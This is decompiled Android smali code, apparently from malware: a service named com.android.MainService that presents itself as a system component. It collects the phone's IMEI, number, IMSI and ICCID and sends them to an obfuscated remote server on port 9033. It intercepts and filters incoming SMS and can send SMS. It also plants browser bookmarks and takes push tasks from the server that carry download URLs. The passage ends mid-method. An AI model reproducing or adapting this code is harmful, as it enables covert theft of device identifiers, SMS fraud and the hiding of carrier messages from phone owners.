.class public Lcom/android/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/MainService$SMSReceiver;
    }
.end annotation


# static fields
.field private static final ACTION_SMS_DELIVERY:Ljava/lang/String; = "com.test.sms.delivery"

.field private static final ACTION_SMS_RECEIVER:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field private static final ACTION_SMS_SEND:Ljava/lang/String; = "com.test.sms.send"

.field private static final ALL_APN_URI:Landroid/net/Uri;

.field private static final PREFERRED_APN_URI:Landroid/net/Uri;


# instance fields
.field private bigpid:Ljava/lang/String;

.field private deliveryReceiver:Lcom/android/MainService$SMSReceiver;

.field private exactnum:Ljava/lang/String;

.field handler:Landroid/os/Handler;

.field private iccid:Ljava/lang/String;

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private is_second:Ljava/lang/String;

.field private ismark:Z

.field private issend:Z

.field private mnc:Ljava/lang/String;

.field newtask:Ljava/util/TimerTask;

.field private nexttime:Ljava/lang/String;

.field private recordlog:Ljava/lang/String;

.field private reply_end_str:Ljava/lang/String;

.field private reply_start_str:Ljava/lang/String;

.field private second_filter_info:Ljava/lang/String;

.field private second_filter_port:Ljava/lang/String;

.field private sendReceiver:Lcom/android/MainService$SMSReceiver;

.field private servicecenter:Ljava/lang/String;

.field private shieldcon:Ljava/lang/String;

.field private shieldnum:Ljava/lang/String;

.field private smallpid:Ljava/lang/String;

.field private smsReceiver:Lcom/android/MainService$SMSReceiver;

.field private task:Ljava/lang/String;

.field private tel:Ljava/lang/String;

.field private testtel:Ljava/lang/String;

.field timer:Ljava/util/Timer;

.field private version:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 33
    const-string v0, "content://telephony/carriers"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 32
    sput-object v0, Lcom/android/MainService;->ALL_APN_URI:Landroid/net/Uri;

    .line 35
    const-string v0, "content://telephony/carriers/preferapn"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 34
    sput-object v0, Lcom/android/MainService;->PREFERRED_APN_URI:Landroid/net/Uri;

    .line 28
    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    const/4 v2, 0x1

    const-string v1, ""

    .line 28
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 40
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    .line 41
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    .line 42
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    .line 43
    const-string v0, "other"

    iput-object v0, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    .line 44
    const-string v0, "02"

    iput-object v0, p0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    .line 45
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->iccid:Ljava/lang/String;

    .line 46
    const-string v0, "10086"

    iput-object v0, p0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    .line 48
    const-string v0, "100"

    iput-object v0, p0, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 49
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->shieldcon:Ljava/lang/String;

    .line 50
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 52
    const-string v0, "1"

    iput-object v0, p0, Lcom/android/MainService;->bigpid:Ljava/lang/String;

    .line 53
    const-string v0, "2"

    iput-object v0, p0, Lcom/android/MainService;->version:Ljava/lang/String;

    .line 54
    const-string v0, "nz-wf-youyi01"

    iput-object v0, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    .line 56
    const-string v0, "no"

    iput-object v0, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    .line 57
    const-string v0, "/sdcard/androidh.log"

    iput-object v0, p0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    .line 58
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 59
    iput-boolean v2, p0, Lcom/android/MainService;->issend:Z

    .line 61
    const-string v0, "0"

    iput-object v0, p0, Lcom/android/MainService;->is_second:Ljava/lang/String;

    .line 62
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->second_filter_port:Ljava/lang/String;

    .line 63
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->second_filter_info:Ljava/lang/String;

    .line 64
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->reply_start_str:Ljava/lang/String;

    .line 65
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->reply_end_str:Ljava/lang/String;

    .line 67
    iput-boolean v2, p0, Lcom/android/MainService;->ismark:Z

    .line 70
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/android/MainService;->timer:Ljava/util/Timer;

    .line 71
    new-instance v0, Lcom/android/MainService$1;

    invoke-direct {v0, p0}, Lcom/android/MainService$1;-><init>(Lcom/android/MainService;)V

    iput-object v0, p0, Lcom/android/MainService;->handler:Landroid/os/Handler;

    .line 82
    new-instance v0, Lcom/android/MainService$2;

    invoke-direct {v0, p0}, Lcom/android/MainService$2;-><init>(Lcom/android/MainService;)V

    iput-object v0, p0, Lcom/android/MainService;->newtask:Ljava/util/TimerTask;

    .line 28
    return-void
.end method

.method private LogService(II)I
    .locals 5
    .parameter "softid"
    .parameter "reqcnt"

    .prologue
    .line 632
    const/4 v0, 0x0

    .line 633
    .local v0, result:I
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 634
    const-string v3, "alfo3gsa3nfdsrfo3isd21d8a8fccosm"

    const/4 v4, 0x1

    invoke-static {v3, v4}, Lcom/android/Base64;->encode(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 635
    const-string v3, ":9033/window.log?id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&softid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 636
    const-string v3, "&cn="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&nt="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sim="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 637
    const-string v3, "&tel="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&imsi="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&iccid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->iccid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sms="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 638
    iget-object v3, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 633
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 640
    .local v1, statisUrl:Ljava/lang/String;
    const/4 v2, 0x0

    invoke-static {v1, v2}, Lcom/android/BaseAuthenicationHttpClient;->getCodeByURL(Ljava/lang/String;I)I

    move-result v0

    .line 641
    return v0
.end method

.method private LogService(ILjava/lang/String;)I
    .locals 5
    .parameter "softid"
    .parameter "showcontent"

    .prologue
    .line 648
    const/4 v0, 0x0

    .line 649
    .local v0, result:I
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 650
    const-string v3, "alfo3gsa3nfdsrfo3isd21d8a8fccosm"

    const/4 v4, 0x1

    invoke-static {v3, v4}, Lcom/android/Base64;->encode(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 651
    const-string v3, ":9033/window.log?id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&softid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 652
    const-string v3, "&cn=1&nt="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sim="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&tel="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 653
    const-string v3, "&imsi="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&iccid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->iccid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sms="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 654
    const-string v3, "&con="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 649
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 656
    .local v1, statisUrl:Ljava/lang/String;
    const/4 v2, 0x0

    invoke-static {v1, v2}, Lcom/android/BaseAuthenicationHttpClient;->getCodeByURL(Ljava/lang/String;I)I

    move-result v0

    .line 657
    return v0
.end method

.method static synthetic access$0(Lcom/android/MainService;)V
    .locals 0
    .parameter

    .prologue
    .line 196
    invoke-direct {p0}, Lcom/android/MainService;->execTask()V

    return-void
.end method

.method static synthetic access$1(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 43
    iget-object v0, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$10(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 65
    iget-object v0, p0, Lcom/android/MainService;->reply_end_str:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$11(Lcom/android/MainService;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .parameter
    .parameter
    .parameter

    .prologue
    .line 660
    invoke-direct {p0, p1, p2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$12(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 48
    iget-object v0, p0, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$13(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 49
    iget-object v0, p0, Lcom/android/MainService;->shieldcon:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$14(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 50
    iget-object v0, p0, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$2(Lcom/android/MainService;Ljava/lang/String;)V
    .locals 0
    .parameter
    .parameter

    .prologue
    .line 43
    iput-object p1, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$3(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 57
    iget-object v0, p0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$4(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 54
    iget-object v0, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$5(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 61
    iget-object v0, p0, Lcom/android/MainService;->is_second:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$6(Lcom/android/MainService;ILjava/lang/String;)I
    .locals 1
    .parameter
    .parameter
    .parameter

    .prologue
    .line 645
    invoke-direct {p0, p1, p2}, Lcom/android/MainService;->LogService(ILjava/lang/String;)I

    move-result v0

    return v0
.end method

.method static synthetic access$7(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 62
    iget-object v0, p0, Lcom/android/MainService;->second_filter_port:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$8(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 63
    iget-object v0, p0, Lcom/android/MainService;->second_filter_info:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$9(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 64
    iget-object v0, p0, Lcom/android/MainService;->reply_start_str:Ljava/lang/String;

    return-object v0
.end method

.method private defaultMark()V
    .locals 5

    .prologue
    const-string v4, "http://"

    .line 672
    const-string v0, "\u6ce1\u6912\u7f51"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://"

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "aa3n2d4rdo5i2dspnahoaj3ifa7oxcjn"

    const/4 v3, 0x7

    invoke-static {v2, v3}, Lcom/android/Base64;->encodebook(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/android/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    .line 673
    const-string v0, "\u6ce1\u6912\u6c60\u5858"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://"

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "acbt32xp2aaogjdixano3cxn"

    const/4 v3, 0x3

    invoke-static {v2, v3}, Lcom/android/Base64;->encodebook(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/android/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    .line 674
    const-string v0, "G3\u7f51\u5740\u5927\u5168"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://"

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "xga3sg73xcfn"

    const/4 v3, 0x0

    invoke-static {v2, v3}, Lcom/android/Base64;->encodebook(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/android/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    .line 675
    return-void
.end method

.method private execMark(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 9
    .parameter "allStr"
    .parameter "record"

    .prologue
    const/4 v7, 0x1

    const-string v8, "|"

    .line 560
    const-string v4, "<title>"

    const-string v5, "</title>"

    invoke-static {p1, v4, v5}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 561
    .local v3, title:Ljava/lang/String;
    const-string v4, "<url>"

    const-string v5, "</url>"

    invoke-static {p1, v4, v5}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 562
    .local v0, insertUrl:Ljava/lang/String;
    const-string v4, "info"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "title = "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " url = "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 563
    invoke-direct {p0, v3, v0}, Lcom/android/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    .line 564
    .local v2, result:I
    const/4 v4, 0x0

    aget-object v4, p2, v4

    const/16 v5, 0xc

    invoke-static {v4, v5}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 565
    new-instance v4, Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "|"

    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    aget-object v5, p2, v7

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "|"

    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const/4 v5, 0x2

    aget-object v5, p2, v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 566
    .local v1, logtxt:Ljava/lang/String;
    iget-object v4, p0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v1, v4}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 567
    invoke-direct {p0, v2, v7}, Lcom/android/MainService;->LogService(II)I

    .line 568
    return-void
.end method

.method private execPush(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 20
    .parameter "allStr"
    .parameter "record"

    .prologue
    .line 485
    const-string v13, ""

    .line 486
    .local v13, softUrl:Ljava/lang/String;
    const-string v6, "no"

    .line 487
    .local v6, isreset:Ljava/lang/String;
    const-string v11, ""

    .line 488
    .local v11, smscontent:Ljava/lang/String;
    const-string v12, ""

    .line 489
    .local v12, smsurl:Ljava/lang/String;
    const/4 v9, 0x0

    .line 490
    .local v9, result:I
    const/16 v4, -0x384

    .line 493
    .local v4, flag:I
    :try_start_0
    const-string v17, "<url>"

    const-string v18, "</url>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 495
    const-string v17, "<smscontent>"

    .line 496
    const-string v18, "</smscontent>"

    .line 495
    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 497
    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v11

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-nez v17, :cond_0

    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v13

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v17

    if-eqz v17, :cond_1

    .line 498
    :cond_0
    const/16 v4, -0x385

    .line 533
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 534
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 535
    .local v8, logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v17, v0

    move-object v0, v8

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 536
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 538
    :goto_0
    return-void

    .line 502
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_1
    :try_start_1
    const-string v17, "<smsurl>"

    const-string v18, "</smsurl>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 503
    const-string v17, ""

    move-object v0, v12

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v17

    if-nez v17, :cond_2

    .line 504
    new-instance v17, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, ","

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    move-object/from16 v0, v17

    move-object v1, v12

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 508
    :cond_2
    const-string v17, "<isreset>"

    const-string v18, "</isreset>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 509
    const-string v17, "no"

    move-object/from16 v0, v17

    move-object v1, v6

